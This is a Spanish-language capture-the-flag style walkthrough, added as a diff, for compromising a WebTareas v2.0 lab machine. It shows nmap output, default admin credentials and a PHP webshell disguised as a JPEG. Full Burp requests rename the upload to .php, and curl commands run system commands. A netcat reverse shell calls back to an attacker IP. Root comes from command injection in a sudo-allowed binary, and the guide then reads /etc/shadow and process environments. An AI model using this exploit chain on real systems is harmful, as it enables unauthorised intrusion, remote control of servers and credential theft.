@@ -1,1 +1,290 @@
+//Escaneamos la IP de la maquina para ver que servicios estan activos:
+
+nmap 10.0.160.230 -sV
+Nmap scan report for 10.0.160.230
+Host is up (0.20s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp    open     http    Apache httpd 2.4.61 ((Debian))
+3351/tcp  filtered btrieve
+12174/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 459.70 seconds
+
+//Autenticación en el servicio web
+
+* Abrir un navegador e ingresar a [http://10.0.160.230/](http://10.0.160.230/).
+
+*En el panel de inicio de sesión de WebTareas v2.0, probar las credenciales por defecto:
+
+        Usuario: admin
+
+        Contraseña: admin
+
+// Creamos una webshell llamada reverse.jpg (En realidad es un archivo .php solo se hace para que el sistema deje subir el archivo)
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd'])) { system($_GET['cmd']); }
+?>
+</pre>
+</body>
+</html>
+
+// Subida del archivo malicioso
+http://10.0.160.230/preferences/updateuser.php?
+
+Ahi estara el usuario admin ahi subimos donde dice la imagen de usuario ponemos nuestra webshell LOL
+Vallan abriendo Burpsuite porque vamos a usar su navegador de burpsuite y el mismo burpsuite
+
+// Hay que buscar esta ruta en burpsuite en la pestana de Proxy y despues HTTP History 
+/includes/upload.php
+le hacemos un Repeater
+DEBE APARECER ASI 
+POST /includes/upload.php HTTP/1.1
+Host: 10.0.160.230
+Content-Length: 275
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Content-Type: image/jpeg
+X-FILENAME: reversse.jpg
+Accept: */*
+Origin: http://10.0.160.230
+Referer: http://10.0.160.230/preferences/updateuser.php?
+Accept-Encoding: gzip, deflate, br
+Cookie: webTareasSID=7frgjmaka61d8hu8q53ma2mgkt
+Connection: keep-alive
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd'])) { system($_GET['cmd']); }
+?>
+</pre>
+</body>
+</html>
+
+// Ahi mismo a la derecha aparece lo que nos interesa 
+HTTP/1.1 200 OK
+Date: Mon, 14 Sep 2026 19:39:53 GMT
+Server: Apache/2.4.61 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 29
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+/var/www/html/files/tmpH8bEMZ
+
+//Esa ruta es la que nos interesa (el tmp cambia asi que no se preocupen)
+// Aunque la subida directa de archivos `.php` está bloqueada, el endpoint acepta extensiones 
+alternativas como `.php3`, `.php5`, `.jpg`, etc., y **no valida que el contenido coincida con el 
+tipo de archivo declarado**, lo que permite subir archivos disfrazados. Adicionalmente, la interfaz 
+web en `updateuser.php` impone una validación del lado del cliente que impide seleccionar archivos 
+que no tengan la extensión de una imagen, devolviendo un error `Unsupported file type` si se 
+intenta cargar otro tipo de extensión. Sin embargo, esta validación es fácilmente evadible al 
+interactuar directamente con el endpoint o pasar el archivo con una extensión `jpg`.
+
+//Acceso a los archivos
+Como se menciona en el [CVE-2021-41919](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-
+41919), es posible acceder directamente a los archivos subidos mediante la ruta: 
+`http://10.0.160.230/files/tmpXXXXXX`: 
+Aun así, estos archivos no pueden ejecutarse, ya que al no tener extensión `.php`, el servidor 
+Apache los trata como archivos estáticos y no como un script.
+
+//Funcionamiento de updateuser.php
+Para lograr la ejecución del archivo y poder modificar su extensión a `php` se usa 
+`/preferences/updateuser.php` que se encarga de la actualización del perfil de usuario. Esta acción 
+realiza una solicitud `POST` a:
+POST /preferences/updateuser.php? HTTP/1.1
+Host: 10.0.160.230
+Content-Length: 2465
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.0.160.230
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh2Urd7TOH4d73fex
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
+Chrome/138.0.0.0 Safari/537.36
+Accept: 
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,ap
+plication/signed-exchange;v=b3;q=0.7
+Referer: http://10.0.160.230/preferences/updateuser.php?
+Accept-Encoding: gzip, deflate, br
+Cookie: webTareasSID=1i3fqg8ebv8i36mq33278ga87n
+Connection: keep-alive
+
+------WebKitFormBoundaryh2Urd7TOH4d73fex
+Content-Disposition: form-data; name="action"
+
+update
+
+<datos>
+
+------WebKitFormBoundaryh2Urd7TOH4d73fex
+Content-Disposition: form-data; name="attnam1"
+
+reverse.jpg
+------WebKitFormBoundaryh2Urd7TOH4d73fex
+Content-Disposition: form-data; name="atttmp1"
+
+/var/www/html/files/tmpLEWHZR
+------WebKitFormBoundaryh2Urd7TOH4d73fex
+Content-Disposition: form-data; name="Save"
+
+Save
+------WebKitFormBoundaryh2Urd7TOH4d73fex--
+
+//En esta petición destacan dos parámetros clave:
+- `attnam1`: representa el **nombre original del archivo**.
+- `atttmp1`: corresponde a la **ruta temporal del archivo** en el servidor, previamente subida 
+mediante `/includes/upload.php`.
+Esta información se utiliza internamente por la aplicación para copiar el archivo a una ruta  
+accesible públicamente y asignar una foto de perfil, en este caso:
+```
+http://10.0.160.230/files/Avatars/X.XXX
+```
+Este funcionamiento se puede aprovechar para sustituir el nombre de la _imagen_(`attnam1`) 
+pasándole un nombre con una extensión `php` simplemente manipulando el valor de `attnam1` en la 
+petición de `updateuser.php`.
+Aprovechando esta funcionalidad, se carga una shell inversa usando `/includes/upload.php`, se 
+intercepta la petición de `/preferences/updateuser.php` y se cambia la extensión de `attnam1` a una 
+extensión `php`.
+
+// asi que modificamos esto: 
+reversse.php
+------WebKitFormBoundaryb7BQPLC3j6l2ksu9
+Content-Disposition: form-data; name="atttmp1"
+
+/var/www/html/files/(el tmp que les arrojo ase pasos atras)
+------WebKitFormBoundaryb7BQPLC3j6l2ksu9
+Content-Disposition: form-data; name="Save"
+
+// Le dan un Sent les debe aparecer esto:
+HTTP/1.1 302 Found
+Date: Mon, 14 Sep 2026 19:43:09 GMT
+Server: Apache/2.4.61 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: ../preferences/pref.php?msg=update
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+//Esa respuesta HTTP 302 Found es justo lo que se espera. Significa que la aplicación procesó la actualización de perfil y te está redirigiendo a la página de preferencias (pref.php?msg=update).
+
+Para verificar si el paso anterior fue exitoso, debes comprobar que el archivo se copió correctamente a la carpeta pública con la extensión .php.
+Verificación y siguiente paso
+
+    Localizar el archivo renombrado:
+    El archivo PHP debió crearse en la carpeta de avatares. La ruta habitual en WebTareas tiene esta estructura:
+
+http://10.0.160.230/files/Avatars/1.php
+
+// Lanzamos un curl en nuestra terminal
+curl "http://10.0.160.230/files/Avatars/1.php?cmd=id"
+
+Nos arroja lo siguiente:
+
+url "http://10.0.160.230/files/Avatars/1.php?cmd=id"
+<html>
+<body>
+<form method="GET" name="1.php">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+</body>
+</html>
+
+
+// Ponemos un netcat al puerto 4242
+nc -lvnp 4242
+
+// Ahora en otra pestana de terminal ponemos lo siguiente:
+curl "http://10.0.160.230/files/Avatars/1.php?cmd=nc%20<TU_IP>%204242%20-e%20/bin/sh"
+
+//Listo nos regresara la conexion en nuestro netcat 
+
+// Estabilizamos la TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+//ESCALADA DE PRIVILEGIOS
+sudo -l
+  Aparece esto:
+(ALL : ALL) NOPASSWD: /usr/local/bin/whomac
+
+//Pasos para obtener permisos de Root
+
+1. Ejecutar el comando vulnerable con SUID
+Aprovecha la vulnerabilidad de inyección de comandos en /usr/local/bin/whomac para otorgarle el permiso SUID al ejecutable /bin/bash:
+sudo /usr/local/bin/whomac " \$(chmod +s /bin/bash) " "{}"
+(Es probable que la pantalla muestre un error de JavaScript como cb is not a function, pero el comando del sistema se habrá procesado de todos modos).
+
+Esto aparece: 
+sudo /usr/local/bin/whomac " \$(chmod +s /bin/bash) " "{}"
+{}
+/app/node_modules/network/lib/linux.js:12
+      cb(err)
+      ^
+
+TypeError: cb is not a function
+    at /app/node_modules/network/lib/linux.js:12:7
+    at ChildProcess.exithandler (child_process.js:315:5)
+    at ChildProcess.emit (events.js:314:20)
+    at maybeClose (internal/child_process.js:1022:16)
+    at Socket.<anonymous> (internal/child_process.js:444:11)
+    at Socket.emit (events.js:314:20)
+    at Pipe.<anonymous> (net.js:676:12)
+
+
+
+2.Verificar que se aplicó el permiso SUID
+Comprueba los permisos de /bin/bash:
+ls -la /bin/bash
+Deberías ver una s en los permisos (-rwsr-sr-x), lo cual indica que la manipulación fue exitosa.
+
+Esto aparece:
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+
+
+3. Iniciar la consola de Root
+Ejecuta bash con el parámetro -p para mantener los privilegios del propietario del archivo (root):
+
+bash -p
+
+Despues de bash -p debe aparecer asi:
+bash-5.1# 
+
+//Hacemos un whoami si aparece root ya la hicimos
+
+SOMOS ROOT
+
+BANDERAS:
+cat /etc/shadow
+cat /etc/passwd
+ls -la /root
+cat /proc/1/environ
+
+
 
